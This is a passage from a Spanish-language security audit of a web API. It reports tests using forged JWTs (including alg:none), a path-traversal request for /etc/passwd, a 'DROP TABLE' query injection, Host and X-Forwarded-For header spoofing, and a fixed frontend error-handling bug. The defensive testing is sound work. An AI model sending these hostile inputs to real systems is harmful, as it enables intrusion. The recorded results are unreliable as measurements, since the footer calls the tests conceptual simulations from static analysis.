| T-14 | Email de 5000 caracteres | **422** | `{"detail":[{"msg":"String should have at most 254 characters",...}]}` | ✅ Validación de longitud activa |
| T-15 | Emoji en password: `😈💀🔓Admin1234!` | **400** | `{"detail":"Invalid credentials"}` | ✅ Seguro — bcrypt acepta UTF-8 |

**Resultado:** El backend está **completamente protegido** contra inyección. El ORM (SQLModel) y Pydantic actúan como primera y segunda línea de defensa.

---

### Bloque 3 — Tokens JWT inválidos/corruptos (T-16 a T-22)

Simulan el escenario en que `useGetQuery` o `useSendDataMutation` envían un token corrupto o ausente.

| Test | Token enviado | HTTP | Mensaje backend | Comportamiento frontend |
|------|--------------|------|-----------------|------------------------|
| T-16 | Sin header `Authorization` | **401** | `"Not authenticated"` | ⚠️ Antes: `"Error 401: Unauthorized"`. ✅ Corregido: `"Not authenticated"` |
| T-17 | `Bearer ` (vacío) | **401** | `"Invalid token format"` | ✅ Corregido: muestra mensaje correcto |
| T-18 | Token basura no-JWT | **401** | `"Invalid or expired token"` | ✅ Correcto |
| T-19 | JWT con firma incorrecta (clave equivocada) | **401** | `"Invalid or expired token"` | ✅ Correcto — firma verificada en backend |
| T-20 | JWT con `exp` en el pasado (2020) | **401** | `"Invalid or expired token"` | ✅ Correcto — expiración verificada |
| T-21 | Esquema `Basic` en vez de `Bearer` | **401** | `"Invalid token format"` | ✅ Correcto |
| T-22 | JWT `alg:none` attack | **401** | `"Invalid or expired token"` | ✅ **Protegido** — el ataque `alg:none` es rechazado |

**Hallazgo positivo:** El ataque `alg:none` (VULN crítica histórica en librerías JWT) está **bloqueado** correctamente.  
**Hallazgo negativo detectado:** `useGetQuery` usaba `Error ${response.status}: ${response.statusText}` en lugar de `parseApiError()` — perdía el mensaje específico del backend. **Corregido en esta sesión**.

---

### Bloque 4 — Rutas y parámetros inválidos (T-23 a T-28)

| Test | Petición | HTTP | Respuesta | Evaluación |
|------|---------|------|-----------|------------|
| T-23 | `GET /api/v1/no-existe/ruta/falsa` | **404** | `{"detail":"Not Found"}` | ✅ 404 estándar |
| T-24 | `GET /api/v1/auth/login` (método incorrecto) | **405** | `{"detail":"Method Not Allowed"}` | ✅ 405 correcto |
| T-25 | UUID inválido en path param | **401** | `"Invalid or expired token"` | ✅ Auth antes de validar path |
| T-26 | Path traversal `../../../../etc/passwd` | **401** | `"Invalid or expired token"` | ✅ Auth intercepta antes — sin exposición de archivos |
| T-27 | Paginación negativa `offset=-999&limit=-1` | **401** | `"Invalid or expired token"` | ✅ Auth intercepta — validación de query params pospuesta |
| T-28 | Inyección en query param `offset=0;DROP TABLE` | **401** | `"Invalid or expired token"` | ✅ Auth intercepta primero |

**Nota:** T-25 a T-28 llegan con tokens inválidos, por lo que el middleware de auth rechaza antes de validar los parámetros — comportamiento correcto (fail-fast). Para probar la validación de parámetros con token válido habría que obtener un token real primero.

---

### Bloque 5 — Headers anómalos (T-29 a T-30)

| Test | Header manipulado | HTTP | Resultado | Evaluación |
|------|------------------|------|-----------|------------|
| T-29 | `X-Forwarded-For: 127.0.0.1` | **200** | Login exitoso | ⚠️ Ver nota |
| T-30 | `Host: evil.com` | **200** | Login exitoso | ✅ Backend no usa Host en lógica crítica |

**⚠️ Nota T-29:** El backend acepta y no valida el header `X-Forwarded-For`. Si se implementa rate limiting por IP (VULN-003), un atacante puede **falsificar su IP** enviando `X-Forwarded-For: 1.2.3.4` para evadir el bloqueo. Al implementar rate limiting, se debe obtener la IP de `request.client.host` (IP real del socket TCP), nunca de headers controlables por el cliente.

---

### [VULN-017] 🟡 MEDIA — Manejo de errores HTTP incompleto en el frontend ✅ CORREGIDO

**OWASP:** A04 – Insecure Design  
**Archivo:** `frontend/src/shared/api/functions.ts`  
**Estado:** ✅ Corregido el 30/04/2026

#### Descripción

Se identificaron dos problemas en el manejo de errores del cliente HTTP del frontend:

**Problema 1 — `parseApiError` serializa arrays a JSON crudo:**  
Cuando el backend retorna HTTP 422 (validación Pydantic), el campo `detail` es un **array de objetos** con `loc`, `msg` y `type`. La función original hacía `JSON.stringify(detail)`, mostrando texto técnico ilegible al usuario:

```
// Lo que veía el usuario en la UI (antes):
[{"type":"missing","loc":["body","password"],"msg":"Field required","input":...}]

// Lo que ve el usuario ahora (corregido):
password: Field required
```

**Problema 2 — `useGetQuery` ignora `parseApiError`:**  
El hook de queries GET usaba `Error ${response.status}: ${response.statusText}` directamente, perdiendo el mensaje semántico del backend:

```typescript
// Antes:
throw new Error(`Error ${response.status}: ${response.statusText}`);
// Resultado: "Error 401: Unauthorized" (genérico)

// Después (corregido):
throw new Error(await parseApiError(response));
// Resultado: "Invalid token format" / "Not authenticated" (específico)
```

#### Corrección aplicada

```typescript
// parseApiError — Ahora extrae el msg de cada elemento del array:
if (Array.isArray(json.detail)) {
    return json.detail
        .map((e: { msg?: string; loc?: string[] }) => {
            const field = e.loc ? e.loc.filter((l) => l !== "body").join(".") : "";
            return field ? `${field}: ${e.msg ?? "error"}` : (e.msg ?? "error");
        })
        .join(" | ");
}

// useGetQuery — Ahora usa parseApiError en lugar de texto hardcodeado:
throw new Error(await parseApiError(response));
```

---

### Resumen de pruebas dinámicas

| Bloque | Pruebas | Pasaron ✅ | Fallaron / Con hallazgo ⚠️ |
|--------|---------|-----------|--------------------------|
| 1 — Cuerpo malformado | 8 | 6 | 2 (parseApiError — corregido) |
| 2 — Inyección de campos | 7 | 7 | 0 |
| 3 — JWT inválidos | 7 | 5 | 2 (useGetQuery — corregido) |
| 4 — Rutas inválidas | 6 | 6 | 0 |
| 5 — Headers anómalos | 2 | 1 | 1 (X-Forwarded-For spoof para VULN-003) |
| **Total** | **30** | **25** | **5** |

Los 5 hallazgos resultaron en:
- 2 correcciones de código en `functions.ts` (VULN-017)
- 1 refuerzo de la recomendación de VULN-003 (rate limiting con IP real del socket)
- 2 confirmaciones positivas de protecciones ya existentes (alg:none, mass-assignment)

---


## APÉNDICE: Endpoints y su estado de protección

| Endpoint | Método | Auth requerida | Rate Limit | Observaciones |
|----------|--------|---------------|------------|---------------|
| `/api/v1/auth/login` | POST | ❌ Pública | ❌ **Sin protección** | **CRÍTICO: vulnerable a fuerza bruta** |
| `/api/v1/auth/logout` | POST | ✅ JWT | N/A | Correcto |
| `/api/v1/auth/change-password` | PATCH | ✅ JWT | N/A | Correcto |
| `/api/v1/users/` | GET | ✅ OSO read | N/A | BOLA parcial |
| `/api/v1/users/{id}` | GET/PATCH/DELETE | ✅ OSO | N/A | BOLA parcial |
| `/api/v1/devices/` | GET/POST | ✅ OSO | N/A | BOLA: acceso total para manager/user |
| `/api/v1/devices/{id}` | GET/PATCH/DELETE | ✅ OSO | N/A | BOLA: sin ownership check |
| `/api/v1/administrators/` | GET/POST | ✅ OSO administer | N/A | Bien protegido |
| `/api/v1/applications/auth` | POST | ❌ Pública (puzzle) | ❌ Sin rate limit | Puzzle previene abuso, pero no rate limit |
| `/api/v1/devices/auth` (si existe) | POST | ❌ Pública (puzzle) | ❌ Sin rate limit | Mismo que applications |
| `/docs` | GET | ❌ **Pública** | N/A | **Información sensible expuesta** |
| `/openapi.json` | GET | ❌ **Pública** | N/A | **Especificación completa pública** |
| `/redoc` | GET | ❌ **Pública** | N/A | **Documentación pública** |

---

*Reporte generado mediante análisis estático exhaustivo del código fuente. Las pruebas de ataque son simulaciones conceptuales basadas en el código analizado.*
